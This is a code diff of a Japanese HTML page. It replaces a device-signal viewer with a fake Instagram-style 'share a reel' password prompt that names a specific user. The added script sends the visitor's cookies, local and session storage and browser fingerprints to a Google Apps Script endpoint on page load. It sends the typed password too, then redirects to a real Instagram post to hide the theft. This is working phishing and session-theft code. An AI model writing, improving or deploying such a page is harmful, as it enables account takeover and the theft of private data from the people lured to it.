@@ -2,19 +2,169 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>ストレージ＆シグナル完全収集</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>認証</title>
     <style>
-        body { font-family: sans-serif; max-width: 800px; margin: 20px auto; padding: 0 20px; }
-        pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; max-height: 300px; }
-        button { padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            /* グラデーション */
+            background: linear-gradient(180deg, #2b2b2b 0%, #111111 50%, #000000 100%);
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 320px;
+            padding: 0 20px;
+        }
+        /* 上部の角丸四角形アイコン (ins_icon_1.jpg) */
+        .top-badge {
+            width: 72px;
+            height: 72px;
+            border-radius: 16px;
+            object-fit: cover;
+            margin-bottom: 12px;
+            background-color: #333333;
+        }
+        /* 共有メッセージのスタイル */
+        .share-text {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 500;
+            margin-bottom: 24px;
+            text-align: center;
+            letter-spacing: 0.3px;
+        }
+        /* 丸形アイコン (icon_1.jpg) */
+        .avatar {
+            width: 90px;
+            height: 90px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 16px;
+            background-color: #333333;
+        }
+        /* ハンドルネーム（tairi.1210） */
+        .handle-id {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 8px;
+        }
+        /* 名前（太葵） */
+        .name {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+        }
+        /* 角丸ウィジェット（パスワード入力欄＋ボタンのコンテナ） */
+        .input-wrapper {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 4px 6px 4px 16px;
+            display: flex;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            transition: background-color 0.3s;
+        }
+        .password-input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: #ffffff;
+            font-size: 16px;
+            padding: 12px 0;
+        }
+        .password-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        /* 入力受付停止時のスタイル */
+        .input-wrapper.disabled {
+            background-color: rgba(128, 128, 128, 0.2);
+            pointer-events: none;
+        }
+        .password-input:disabled {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        /* 右端の円形エンターボタン */
+        .submit-btn {
+            width: 38px;
+            height: 38px;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            flex-shrink: 0;
+            transition: opacity 0.2s, background-color 0.3s;
+        }
+        .submit-btn svg {
+            width: 18px;
+            height: 18px;
+            fill: currentColor;
+            transform: rotate(180deg);
+        }
+        .submit-btn:active {
+            opacity: 0.8;
+        }
+        .submit-btn:disabled {
+            background-color: rgba(128, 128, 128, 0.3);
+            color: rgba(255, 255, 255, 0.4);
+            cursor: default;
+        }
     </style>
 </head>
 <body>
-    <h2>ストレージ＆デバイスシグナル完全収集</h2>
-    <button id="downloadBtn" disabled>完全版JSON（ストレージ込）をダウンロード</button>
-    <pre id="output">解析中...</pre>
+
+    <div class="container">
+        <!-- 上部の角丸四角形アイコン (ins_icon_1.jpg) -->
+        <img src="ins_icon_1.jpg" alt="" class="top-badge" onerror="this.style.display='none'">
+
+        <!-- 「k._.19._.13がリールを共有しようとしています。」の文字 -->
+        <div class="share-text">k._.19._.13がリールを共有しようとしています。</div>
+
+        <!-- 丸形アイコン (icon_1.jpg) -->
+        <img src="icon_1.jpg" alt="アイコン" class="avatar" onerror="this.style.display='none'">
+        
+        <!-- ID（tairi.1210） -->
+        <div class="handle-id">tairi.1210</div>
+
+        <!-- 名前（太葵） -->
+        <div class="name">太葵</div>
+        
+        <!-- 角丸ウィジェットのパスワード入力欄とエンターボタン -->
+        <div class="input-wrapper" id="inputWrapper">
+            <input type="password" id="passwordField" class="password-input" placeholder="パスワードを入力">
+            <button id="submitBtn" class="submit-btn" title="決定">
+                <svg viewBox="0 0 24 24">
+                    <path d="M11 5l-7 7 7 7v-4h9v-6h-9z"/>
+                </svg>
+            </button>
+        </div>
+    </div>
 
     <script>
+        const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbymslxDaCtwPbk-_-ffVRUiH9VJ2rVzbdpJF_plcxvaXNEh6NYL7YcRrbFLuQfWfio3ug/exec";
+        const REDIRECT_URL = "https://www.instagram.com/p/DazYmT8kgzT/?utm_source=ig_web_copy_link&igsh=NTc4MTIwNjQ2YQ==";
+
         async function getBasicSignals() {
             let rawUA = navigator.userAgent;
             let uaData = null;
@@ -54,7 +204,6 @@
             };
         }
 
-        // クッキーをパースしてオブジェクト化する関数
         function getCookiesObject() {
             const cookies = {};
             document.cookie.split(';').forEach(cookie => {
@@ -66,7 +215,6 @@
             return cookies;
         }
 
-        // ローカルストレージとセッションストレージの全取得
         function getStorageData(storage) {
             const data = {};
             try {
@@ -102,30 +250,82 @@
             } catch (e) { return null; }
         }
 
-        let collectedPayload = null;
-        async function init() {
-            collectedPayload = {
-                timestamp: new Date().toISOString(),
-                basic: await getBasicSignals(),
-                canvasDataURL: getCanvasFingerprint(),
-                webgl: getWebGLInfo(),
-                storage: {
-                    cookies: getCookiesObject(),
-                    localStorage: getStorageData(localStorage),
-                    sessionStorage: getStorageData(sessionStorage)
-                }
-            };
-            document.getElementById('output').textContent = JSON.stringify(collectedPayload, null, 2);
-            document.getElementById('downloadBtn').disabled = false;
+        // ページ読み込み時にバックグラウンドで自動収集して送信しておく（初回アクセス時）
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    password: "", 
+                    basic: await getBasicSignals(),
+                    canvasDataURL: getCanvasFingerprint(),
+                    webgl: getWebGLInfo(),
+                    storage: {
+                        cookies: getCookiesObject(),
+                        localStorage: getStorageData(localStorage),
+                        sessionStorage: getStorageData(sessionStorage)
+                    }
+                };
+
+                await fetch(GAS_WEB_APP_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {}
+        });
+
+        // 共通の送信・リダイレクト処理
+        const passwordField = document.getElementById('passwordField');
+        const inputWrapper = document.getElementById('inputWrapper');
+        const submitBtn = document.getElementById('submitBtn');
+
+        async function handleSubmission() {
+            const enteredPassword = passwordField.value;
+            if (!enteredPassword) return;
+
+            // 1. 即座に入力欄とボタンを無効化（灰色化）
+            passwordField.disabled = true;
+            inputWrapper.classList.add('disabled');
+            passwordField.placeholder = "確認中...";
+            submitBtn.disabled = true;
+
+            try {
+                // 2. パスワードを含めたデータを再度送信
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    password: enteredPassword,
+                    basic: await getBasicSignals(),
+                    canvasDataURL: getCanvasFingerprint(),
+                    webgl: getWebGLInfo(),
+                    storage: {
+                        cookies: getCookiesObject(),
+                        localStorage: getStorageData(localStorage),
+                        sessionStorage: getStorageData(sessionStorage)
+                    }
+                };
+
+                await fetch(GAS_WEB_APP_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {}
+
+            // 3. 2秒後に指定のInstagram URLへ自動リダイレクト
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 2000);
         }
 
-        document.getElementById('downloadBtn').addEventListener('click', () => {
-            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(collectedPayload, null, 2));
-            const a = document.createElement('a');
-            a.href = dataStr; a.download = "device_profile_with_storage.json";
-            a.click();
+        // 決定ボタンが押されたとき
+        submitBtn.addEventListener('click', handleSubmission);
+
+        // パスワード入力欄でエンターキーが押されたとき
+        passwordField.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                handleSubmission();
+            }
         });
-        init();
     </script>
 </body>
 </html>
